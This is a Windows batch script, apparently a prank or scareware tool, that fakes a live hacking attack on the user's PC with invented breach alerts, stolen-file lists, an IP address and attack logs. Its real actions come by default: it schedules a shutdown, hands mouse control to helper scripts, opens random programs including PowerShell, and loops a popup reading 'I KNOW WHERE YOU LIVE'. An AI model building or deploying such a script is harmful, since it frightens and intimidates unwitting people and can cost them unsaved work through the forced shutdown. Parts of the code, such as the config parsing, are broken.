@echo off
setlocal EnableDelayedExpansion
title !!! CRITICAL SECURITY BREACH !!!
mode con: cols=100 lines=35
color 0c

:: DEFAULT SETTINGS (can be overridden by config.ini)
set total=300
set seconds=300
set ENABLE_SHUTDOWN=true
set SHUTDOWN_DELAY=320
set ENABLE_MOUSE_CONTROL=true
set ENABLE_APP_LAUNCHES=true
set ENABLE_KILL_SWITCH=true

:: READ CONFIG FILE IF IT EXISTS
if exist "%~dp0config.ini" (
    for /f "usebackq delims== tokens=1,2" %%A in ("%~dp0config.ini") do (
        REM Skip section headers and comments
        if not "%%A:~0,1%%.""==[. (
            if "%%A"=="DURATION" set total=%%B & set seconds=%%B
            if "%%A"=="ENABLE_SHUTDOWN" set ENABLE_SHUTDOWN=%%B
            if "%%A"=="SHUTDOWN_DELAY" set SHUTDOWN_DELAY=%%B
            if "%%A"=="ENABLE_MOUSE_CONTROL" set ENABLE_MOUSE_CONTROL=%%B
            if "%%A"=="ENABLE_APP_LAUNCHES" set ENABLE_APP_LAUNCHES=%%B
            if "%%A"=="ENABLE_KILL_SWITCH" set ENABLE_KILL_SWITCH=%%B
        )
    )
)

:: START SHUTDOWN IF ENABLED
if /i "!ENABLE_SHUTDOWN!"=="true" (
    shutdown /s /t !SHUTDOWN_DELAY!
)

:: START KILL SWITCH IF ENABLED
if /i "!ENABLE_KILL_SWITCH!"=="true" (
    if exist "%~dp0KillSwitch.ahk" (
        start "" /b "" "%~dp0KillSwitch.ahk" 2>nul
    )
)

:: START MOUSE CONTROL IF ENABLED
if /i "!ENABLE_MOUSE_CONTROL!"=="true" (
    if exist "%~dp0MouseControl.ahk" (
        start "" /b "" "%~dp0MouseControl.ahk" 2>nul
    )
)

:loop
cls

:: CALCULATE PROGRESS (REAL)
set /a percent=(total-seconds)*100/total
set /a bars=(total-seconds)*30/total

:: BUILD PROGRESS BAR
set bar=
for /L %%i in (1,1,!bars!) do set bar=!bar!#
for /L %%i in (!bars!,1,29) do set bar=!bar!.

echo ==================================================================================
echo   UNAUTHORIZED REMOTE ACCESS DETECTED - SYSTEM COMPROMISE IN PROGRESS
echo ==================================================================================
echo.
echo   [CRITICAL ALERT] Your system has been breached by sophisticated malware
echo.
echo USER............. %username%
echo MACHINE.......... %computername%
echo OS VERSION....... Windows 10 (Build 19045)
echo SYSTEM UPTIME.... 247 Days 14:32:18
echo SESSION ID....... 728182931
echo REMOTE IP........ 185.82.13.92
echo REMOTE PORT..... 47829
echo CONNECTION....... ACTIVE / PERSISTENT
echo ENCRYPTION...... 256-bit AES (BYPASSED)
echo.
echo FILES ACCESSED/COPIED:
echo  - C:\Users\%username%\Documents\Personal\
echo  - C:\Users\%username%\AppData\Local\Google\Chrome\User Data\
echo  - C:\Users\%username%\Desktop\
echo  - C:\Windows\System32\config\SAM (SHADOW HASHES)
echo  - C:\Windows\Temp\Cookies.txt (BROWSER COOKIES)
echo.
echo NETWORK ACTIVITY:
set /a iprand=%random%
echo  - HTTP/HTTPS traffic INTERCEPTED
echo  - FTP credentials CAPTURED (4 accounts)
echo  - VPN tunnel ESTABLISHED
echo  - DNS HIJACKED - 12.845.302.156
echo  - Packets sent: 1,247,392 | Packets received: 845,021
echo.
echo TIME REMAINING... !seconds! seconds     THREAT LEVEL: MAXIMUM
echo PROGRESS......... !percent!%%
echo.
echo [!bar!]
echo.
echo ==================================================================================
echo MEMORY DUMP AND CODE EXECUTION ANALYSIS:
echo ==================================================================================

:: RANDOM CODE DISPLAY
set /a code=%random% %% 30
if %code%==0  echo 0x7FFF4A82: mov rax, [rsp+0x28] ; load stack frame
if %code%==1  echo 0x7FFF4A89: add rcx, 0x100 ; pointer arithmetic
if %code%==2  echo 0x7FFF4A90: jmp 0x7FFF5120 ; branch taken
if %code%==3  echo 0x7FFF4A97: call CreateFileA ; API hook detected
if %code%==4  echo 0x7FFF4AA0: xor eax, eax ; zero register
if %code%==5  echo 0x7FFF4AA7: cmp rbx, [rcx] ; compare operation
if %code%==6  echo 0x7FFF4AB0: je 0x7FFF4C45 ; conditional branch
if %code%==7  echo 0x7FFF4AB7: mov r8, r9 ; register copy
if %code%==8  echo 0x7FFF4AC0: test eax, 0xFF ; bitwise test
if %code%==9  echo 0x7FFF4AC7: lea rdx, [rel rip+0x50] ; load effective address
if %code%==10 echo 0x7FFF4AD0: and rsi, 0xFFFFFFF0 ; bitwise AND
if %code%==11 echo 0x7FFF4AD7: or rax, 0x8000 ; bitwise OR
if %code%==12 echo 0x7FFF4AE0: shr rbx, 4 ; bit shift right
if %code%==13 echo 0x7FFF4AE7: imul rcx, 0x100 ; multiply signed
if %code%==14 echo 0x7FFF4AF0: sub rsp, 0x48 ; stack frame setup
if %code%==15 echo 0x7FFF4AF7: push rbp ; save base pointer
if %code%==16 echo 0x7FFF4B00: ret ; return from function
if %code%==17 echo 0x7FFF4B07: syscall ; system call invoked
if %code%==18 echo 0x7FFF4B10: nop ; no operation
if %code%==19 echo 0x7FFF4B17: int 0x80 ; interrupt handler
if %code%==20 echo 0x7FFF4B20: mov dword [rax], 0x41414141 ; memory write
if %code%==21 echo 0x7FFF4B27: lea rax, [rip+0x1000] ; RIP-relative addressing
if %code%==22 echo 0x7FFF4B30: cmp byte [rbx+8], 0 ; byte comparison
if %code%==23 echo 0x7FFF4B37: jne 0x7FFF4D00 ; jump not equal
if %code%==24 echo 0x7FFF4B40: endbr64 ; indirect branch tracking
if %code%==25 echo 0x7FFF4B47: bts rax, rcx ; bit test and set
if %code%==26 echo 0x7FFF4B50: clflush [rax] ; cache line flush
if %code%==27 echo 0x7FFF4B57: lfence ; load fence
if %code%==28 echo 0x7FFF4B60: mfence ; memory fence
if %code%==29 echo 0x7FFF4B67: prefetchnta [rax] ; prefetch non-temporal
echo.

set /a r=%random% %% 70
if %r%==0  echo [10:41:12] svchost.exe (PID 884) privilege escalation successful
if %r%==1  echo [10:41:13] lsass.exe memory access granted
if %r%==2  echo [10:41:14] outbound TLS connection established :443
if %r%==3  echo [10:41:15] credential material identified
if %r%==4  echo [10:41:16] NTFS volume scan completed
if %r%==5  echo [10:41:17] user profile data indexed
if %r%==6  echo [10:41:18] Windows Defender response delayed
if %r%==7  echo [10:41:19] registry persistence key written
if %r%==8  echo [10:41:20] scheduled task created (SYSTEM)
if %r%==9  echo [10:41:21] command-and-control heartbeat OK
if %r%==10 echo [10:41:22] AMSI scan interface bypassed
if %r%==11 echo [10:41:23] process injection completed
if %r%==12 echo [10:41:24] security event logs inaccessible
if %r%==13 echo [10:41:25] encryption context initialized
if %r%==14 echo [10:41:26] outbound data chunk queued
if %r%==15 echo [10:41:27] token duplication successful
if %r%==16 echo [10:41:28] SYSTEM shell confirmed
if %r%==17 echo [10:41:29] network adapter enumerated
if %r%==18 echo [10:41:30] active user sessions mapped
if %r%==19 echo [10:41:31] forensic traces minimized
if %r%==20 echo [10:41:32] Windows Firewall rules modified
if %r%==21 echo [10:41:33] DNS cache poisoning successful
if %r%==22 echo [10:41:34] SMB shares enumerated - 12 found
if %r%==23 echo [10:41:35] RDP session established on port 3389
if %r%==24 echo [10:41:36] BitLocker encryption status: DISABLED
if %r%==25 echo [10:41:37] Active Directory credentials cached
if %r%==26 echo [10:41:38] Network topology map created
if %r%==27 echo [10:41:39] USB device history extracted
if %r%==28 echo [10:41:40] Browser history and cookies harvested
if %r%==29 echo [10:41:41] Windows Update service stopped
if %r%==30 echo [10:41:42] WMI event subscription created
if %r%==31 echo [10:41:43] Malware scan disabled temporarily
if %r%==32 echo [10:41:44] Clipboard data captured and logged
if %r%==33 echo [10:41:45] Keyboard logger installed (kernel level)
if %r%==34 echo [10:41:46] Camera and microphone access granted
if %r%==35 echo [10:41:47] Installed programs database indexed
if %r%==36 echo [10:41:48] Document metadata extracted
if %r%==37 echo [10:41:49] System recovery options disabled
if %r%==38 echo [10:41:50] Shadow copy storage deleted
if %r%==39 echo [10:41:51] Backup catalog files removed
if %r%==40 echo [10:41:52] Certificate store enumerated
if %r%==41 echo [10:41:53] Saved password manager credentials found
if %r%==42 echo [10:41:54] Email client configuration extracted
if %r%==43 echo [10:41:55] VPN connection profiles downloaded
if %r%==44 echo [10:41:56] SSH keys and private certificates found
if %r%==45 echo [10:41:57] Temp files and cache analyzed
if %r%==46 echo [10:41:58] Hibernation file extracted
if %r%==47 echo [10:41:59] Memory dump initiated
if %r%==48 echo [10:42:00] Boot sector integrity check - FAILED
if %r%==49 echo [10:42:01] Bootloader modification detected
if %r%==50 echo [10:42:02] MBR scan complete - 3 infections found
if %r%==51 echo [10:42:03] DLL injection points identified
if %r%==52 echo [10:42:04] Code cave exploitation prepared
if %r%==53 echo [10:42:05] Return-oriented programming gadgets found
if %r%==54 echo [10:42:06] Control flow guard bypass initialized
if %r%==55 echo [10:42:07] Address space layout randomization defeated
if %r%==56 echo [10:42:08] Privilege boundary crossing achieved
if %r%==57 echo [10:42:09] User mode hook points installed
if %r%==58 echo [10:42:10] Kernel mode access obtained
if %r%==59 echo [10:42:11] System call table modified
if %r%==60 echo [10:42:12] Device driver loaded (unsigned)
if %r%==61 echo [10:42:13] IOMMU protection bypassed
if %r%==62 echo [10:42:14] Physical memory access confirmed
if %r%==63 echo [10:42:15] Hypervisor detection evasion active
if %r%==64 echo [10:42:16] Sandbox escape successful
if %r%==65 echo [10:42:17] Virtual machine detection avoided
if %r%==66 echo [10:42:18] Debugger presence check - NEGATIVE
if %r%==67 echo [10:42:19] Reverse engineering tools not found
if %r%==68 echo [10:42:20] Persistence mechanisms: 7 installed
if %r%==69 echo [10:42:21] Data exfiltration channels prepared

echo.
echo NOTICE: SYSTEM MAY APPEAR UNRESPONSIVE
echo NOTICE: BACKGROUND OPERATIONS ACTIVE
echo.

:: LAUNCH RANDOM APPLICATIONS AND FILES (ONLY IF ENABLED)
if /i "!ENABLE_APP_LAUNCHES!"=="true" (
    set /a apprand=%random% %% 10
    if %apprand%==0 start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" 2>nul
    if %apprand%==1 start "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" 2>nul
    if %apprand%==2 start "" "C:\Program Files\Mozilla Firefox\firefox.exe" 2>nul
    if %apprand%==3 start "" "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" 2>nul
    if %apprand%==4 explorer.exe "%USERPROFILE%\Pictures" >nul 2>&1
    if %apprand%==5 start "" "notepad.exe" 2>nul
    if %apprand%==6 start "" "calc.exe" 2>nul
    if %apprand%==7 start "" "mspaint.exe" 2>nul
    if %apprand%==8 explorer.exe "C:\Users" >nul 2>&1
    if %apprand%==9 start "" "powershell.exe" 2>nul
)

:: POPUPS START AFTER 2 MINUTES (NON-BLOCKING, ONCE)
if !seconds! LSS 120 if not defined WARNED (
    set WARNED=1
    start "" /b msg * WARNING: SYSTEM COMPROMISED
)

:: EXTRA PANIC MESSAGE AFTER 1 MINUTE
if !seconds! LSS 60 echo !!! CRITICAL FAILURE IMMINENT !!!

:: WHEN TIMER HITS ZERO -> GO TO PANIC
if !seconds! LEQ 0 goto panic

set /a seconds-=1

timeout /t 1 >nul
goto loop

:end
cls
color 4f
echo ==================================================================================
echo                    SYSTEM BREACH COMPLETE
echo ==================================================================================
echo.
echo ALL FILES COPIED
echo ALL CREDENTIALS STOLEN
echo REMOTE CONTROL ACTIVE
echo.
timeout /t 3 >nul

cls
color 0c
echo INITIATING FINAL PAYLOAD...
timeout /t 2 >nul

echo SELF DESTRUCT SEQUENCE
timeout /t 1 >nul
echo 5
timeout /t 1 >nul
echo 4
timeout /t 1 >nul
echo 3
timeout /t 1 >nul
echo 2
timeout /t 1 >nul
echo 1
timeout /t 1 >nul

:panic
cls
color 0a
msg * I  K N O W   W H E R E   Y O U   L I V E

:: Check for emergency shutdown cancellation
if exist "%temp%\killswitch.tmp" (
    color 0a
    cls
    echo SYSTEM RESTORED - ALL THREATS NEUTRALIZED
    taskkill /f /im shutdown.exe >nul 2>&1
    shutdown /a >nul 2>&1
    goto cleanup
)

timeout /t 2 >nul
goto panic

:cleanup
del "%temp%\killswitch.tmp" >nul 2>&1
del "%temp%\hotkey_detector.vbs" >nul 2>&1
taskkill /f /im KillSwitch.ahk >nul 2>&1
taskkill /f /im MouseControl.ahk >nul 2>&1
timeout /t 2 >nul
exit /b


